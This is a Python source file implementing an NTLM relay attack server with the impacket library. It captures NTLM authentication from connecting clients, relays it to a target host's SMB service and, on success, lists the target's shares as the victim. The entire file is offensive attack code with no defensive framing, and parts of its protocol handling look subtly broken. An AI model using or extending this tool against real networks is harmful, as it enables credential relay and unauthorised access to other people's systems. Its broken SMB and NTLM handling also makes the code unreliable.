import socket
import threading
import logging
from impacket import smb, nmb
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21
import struct
import time

class NTLMRelayServer:
    def __init__(self, listen_address='0.0.0.0', listen_port=8445):
        self.listen_address = listen_address
        self.listen_port = listen_port
        self.running = False
        self.server_socket = None
        self.clients = []
        self.lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        self.server_thread = None
        self.target = None
        self.target_computer_name = None
        self.fallback_ports = [8445, 8446, 8447, 8448, 8449]

    def set_target(self, target):
        """Set the target for NTLM relay"""
        try:
            # Basic IP format validation
            try:
                socket.inet_aton(target)
                self.target = target
                # Try to get NetBIOS name
                self._get_target_computer_name()
                self.logger.info(f"[+] Target IP set to: {self.target}")
                return
            except socket.error:
                pass

            # Try DNS resolution if not an IP
            try:
                target_ip = socket.gethostbyname(target)
                self.target = target_ip
                # Try to get NetBIOS name
                self._get_target_computer_name()
                self.logger.info(f"[+] Resolved target {target} to IP: {self.target}")
            except socket.gaierror as e:
                raise ValueError(f"Could not resolve target hostname: {target} - {str(e)}")

        except Exception as e:
            self.logger.error(f"[-] Failed to set target: {e}")
            raise

    def _get_target_computer_name(self):
        """Try to get the NetBIOS name of the target"""
        try:
            nm = nmb.NetBIOS()
            nm.set_timeout(1)
            names = nm.queryIPForName(self.target)
            if names:
                self.target_computer_name = names[0]
                self.logger.info(f"[+] Target computer name: {self.target_computer_name}")
            else:
                # Fallback to IP if NetBIOS name not found
                self.target_computer_name = self.target
                self.logger.debug(f"[*] Using IP as computer name: {self.target_computer_name}")
        except Exception as e:
            # Fallback to IP if NetBIOS query fails
            self.target_computer_name = self.target
            self.logger.debug(f"[*] NetBIOS query failed, using IP as computer name: {self.target_computer_name}")

    def _try_bind_port(self):
        """Try to bind to an available port"""
        last_error = None
        tried_ports = []

        # Try the specified port first
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.listen_address, self.listen_port))
            return True
        except socket.error as e:
            last_error = e
            tried_ports.append(self.listen_port)
            self.server_socket.close()

        # Try fallback ports
        for port in self.fallback_ports:
            if port in tried_ports:
                continue
            
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind((self.listen_address, port))
                self.listen_port = port
                return True
            except socket.error as e:
                last_error = e
                tried_ports.append(port)
                self.server_socket.close()

        raise last_error

    def start(self):
        """Start the NTLM Relay Server"""
        if not self.target:
            raise ValueError("Target must be set before starting the server")

        try:
            # Test target connectivity first
            self._test_target_connectivity()
            
            # Try to bind to a port
            if self._try_bind_port():
                self.server_socket.listen(5)
                self.running = True
                self.server_thread = threading.Thread(target=self._accept_connections, daemon=True)
                self.server_thread.start()
                self.logger.info(f"[+] NTLM Relay Server listening on {self.listen_address}:{self.listen_port}")
                time.sleep(0.1)  # Give the thread time to start
                
        except Exception as e:
            self.logger.error(f"[-] Failed to start server: {e}")
            self.stop()
            raise

    def _test_target_connectivity(self):
        """Test if target is reachable"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target, 445))
            sock.close()
            
            if result != 0:
                raise ConnectionError(f"Target {self.target} is not accessible on port 445")
                
            self.logger.info(f"[+] Target {self.target} is accessible")
            
        except Exception as e:
            raise ConnectionError(f"Failed to connect to target: {e}")

    def _connect_to_target(self):
        """Establish SMB connection object for target"""
        try:
            # Create SMB Connection with proper parameters
            # Use target IP for remoteHost, and resolved/fallback name for remoteName
            smbClient = SMBConnection(remoteName=self.target_computer_name,
                                    remoteHost=self.target,
                                    myName='RELAY', # Use a generic name for our client
                                    sess_port=445)

            smbClient.setTimeout(5) # Set timeout
            # Let impacket negotiate dialect by default, remove explicit setting
            # smbClient.preferred_dialect = smb.SMB_DIALECT

            # Return the SMBConnection object. Connection will be established by sendNegotiate.
            self.logger.debug(f"[*] SMBConnection object created for target {self.target}")
            return smbClient

        except Exception as e:
            # Log errors during SMBConnection object creation itself
            self.logger.error(f"[-] Error creating SMBConnection object for target {self.target}: {e}", exc_info=True)
            return None

    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client, address = self.server_socket.accept()
                self.logger.info(f"[+] Connection from {address[0]}:{address[1]}")
                
                with self.lock:
                    self.clients.append(client)
                
                client_thread = threading.Thread(
                    target=self._handle_relay_authentication,
                    args=(client, address),
                    daemon=True
                )
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"[-] Error accepting connection: {e}")
                break

    def _handle_relay_authentication(self, client_socket, address):
        """Handle the NTLM relay authentication process"""
        target_conn = None # Initialize target_conn
        try:
            self.logger.debug(f"[*] Handling connection from {address[0]}")
            # Establish connection to target for relaying
            target_conn = self._connect_to_target()
            if not target_conn:
                self.logger.debug(f"[*] Failed to create target connection object for {address[0]}")
                return

            self.logger.debug(f"[*] Receiving NTLM Type 1 from {address[0]}")
            # Get NTLM Type 1 from client
            ntlm_nego = self._receive_ntlm_message(client_socket)
            if not ntlm_nego:
                self.logger.debug(f"[*] Did not receive valid NTLM Type 1 from {address[0]}")
                return
            self.logger.info("[+] NTLM Type 1 received from client")

            self.logger.debug(f"[*] Relaying NTLM Type 1 to target {self.target} for {address[0]}")
            # Connect to target and relay Type 1
            target_challenge = self._relay_to_target(target_conn, ntlm_nego)
            if not target_challenge:
                self.logger.debug(f"[*] Failed to get challenge from target {self.target} for {address[0]}")
                return
            self.logger.info("[+] Received Type 2 challenge from target")

            self.logger.debug(f"[*] Sending challenge to client {address[0]}")
            # Send challenge to client and get response
            auth_response = self._get_auth_response(client_socket, target_challenge)
            if not auth_response:
                self.logger.debug(f"[*] Did not receive valid NTLM Type 3 from {address[0]}")
                return
            self.logger.info("[+] Got Type 3 auth response from client")

            self.logger.debug(f"[*] Relaying NTLM Type 3 to target {self.target} for {address[0]}")
            # Relay the authentication to target
            if self._authenticate_target(target_conn, auth_response):
                self.logger.info("[+] Successfully authenticated to target!")
                self._execute_commands(target_conn)
            else:
                self.logger.error("[-] Authentication to target failed")

        except Exception as e:
            self.logger.error(f"[-] Relay authentication failed: {e}", exc_info=True)
        finally:
            # Ensure target_conn is closed if it was opened
            if target_conn:
                try:
                    target_conn.disconnect()
                except Exception as disconnect_e:
                    self.logger.debug(f"Error disconnecting target connection: {disconnect_e}")

            with self.lock:
                if client_socket in self.clients:
                    self.clients.remove(client_socket)
            client_socket.close()

    def _receive_ntlm_message(self, client_socket):
        """Receive NTLM message from client"""
        try:
            # Set a timeout for receiving data from the client
            client_socket.settimeout(10) # e.g., 10 seconds
            data = client_socket.recv(4096)
            if not data: # Handle case where client disconnects immediately
                self.logger.debug("[*] Client disconnected before sending data.")
                return None
            if b'NTLMSSP' in data:
                return data
            # Log if non-NTLM data is received
            self.logger.debug(f"[*] Received non-NTLM data from client: {data[:100]}...")
            return None
        except socket.timeout: # Handle potential socket timeouts
             self.logger.debug("[*] Socket timed out waiting for NTLM message from client.")
             return None
        except Exception as e:
            self.logger.error(f"[-] Error receiving NTLM message: {e}", exc_info=True)
            return None
        finally:
            # Reset timeout to blocking or None if preferred for subsequent operations
            client_socket.settimeout(None)

    def _relay_to_target(self, target_conn, ntlm_nego):
        """Relay NTLM Type 1 message to target and get challenge"""
        try:
            challenge = target_conn.sendNegotiate(ntlm_nego)
            return challenge
        except Exception as e:
            self.logger.error(f"[-] Failed to relay to target: {e}")
            return None

    def _get_auth_response(self, client_socket, challenge):
        """Get Type 3 message from client"""
        try:
            client_socket.send(challenge)
            auth_response = client_socket.recv(4096)
            if b'NTLMSSP' in auth_response:
                return auth_response
            return None
        except Exception as e:
            self.logger.error(f"[-] Failed to get auth response: {e}")
            return None

    def _authenticate_target(self, target_conn, auth_response):
        """Authenticate to target with Type 3 message"""
        try:
            return target_conn.sendAuth(auth_response)
        except Exception as e:
            self.logger.error(f"[-] Authentication failed: {e}")
            return False

    def _execute_commands(self, target_conn):
        """Execute commands on successful authentication"""
        try:
            self.logger.info("[+] Listing shares on target:")
            shares = target_conn.listShares()
            for share in shares:
                self.logger.info(f"    - {share['shi1_netname']}")
        except Exception as e:
            self.logger.error(f"[-] Failed to execute commands: {e}")

    def stop(self):
        """Stop the NTLM Relay Server"""
        self.running = False
        
        with self.lock:
            for client in self.clients:
                try:
                    client.close()
                except:
                    pass
            self.clients.clear()
        
        if self.server_socket:
            try:
                self.server_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            finally:
                self.server_socket.close()
                self.server_socket = None

        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=1.0)
            
        self.logger.info("[*] NTLM Relay Server stopped")